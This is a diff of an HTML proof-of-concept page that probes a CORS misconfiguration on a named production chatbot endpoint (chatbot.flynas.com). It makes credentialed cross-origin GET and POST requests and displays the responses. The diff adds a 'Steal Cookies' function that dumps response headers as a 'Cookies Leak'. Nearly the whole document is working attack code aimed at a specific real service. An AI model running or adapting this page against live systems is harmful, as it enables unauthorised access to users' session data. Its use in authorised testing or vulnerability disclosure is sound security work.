@@ -12,25 +12,31 @@
 <body>
   <h2>Flynas Chatbot CORS PoC</h2>
 
-  <input type="text" id="url" size="80"
+  <label>Target URL:</label><br>
+  <input type="text" id="url" size="90"
     value="https://chatbot.flynas.com/socket.io/?EIO=3&transport=polling" />
 
-  <br>
+  <br><br>
   <button onclick="doGet()">GET Test</button>
   <button onclick="doPost()">POST Test</button>
+  <button onclick="doCookies()">Steal Cookies</button>
 
   <h3>Response:</h3>
   <pre id="output"></pre>
 
   <script>
+    function log(msg) {
+      document.getElementById("output").innerText = msg;
+    }
+
     async function doGet() {
       const url = document.getElementById("url").value;
       try {
         let res = await fetch(url, { credentials: "include" });
         let text = await res.text();
-        document.getElementById("output").innerText = text;
+        log("=== GET Response ===\n" + text);
       } catch (e) {
-        document.getElementById("output").innerText = e;
+        log("GET Error: " + e);
       }
     }
 
@@ -41,12 +47,26 @@
           method: "POST",
           credentials: "include",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ text: "Hello from PoC site" })
+          body: JSON.stringify({ text: "Hello from external PoC site" })
         });
         let text = await res.text();
-        document.getElementById("output").innerText = text;
+        log("=== POST Response ===\n" + text);
       } catch (e) {
-        document.getElementById("output").innerText = e;
+        log("POST Error: " + e);
+      }
+    }
+
+    async function doCookies() {
+      const url = document.getElementById("url").value;
+      try {
+        let res = await fetch(url, { credentials: "include" });
+        let headers = "";
+        for (let [k,v] of res.headers.entries()) {
+          headers += k + ": " + v + "\n";
+        }
+        log("=== Headers / Cookies Leak ===\n" + headers);
+      } catch (e) {
+        log("Cookie Steal Error: " + e);
       }
     }
   </script>
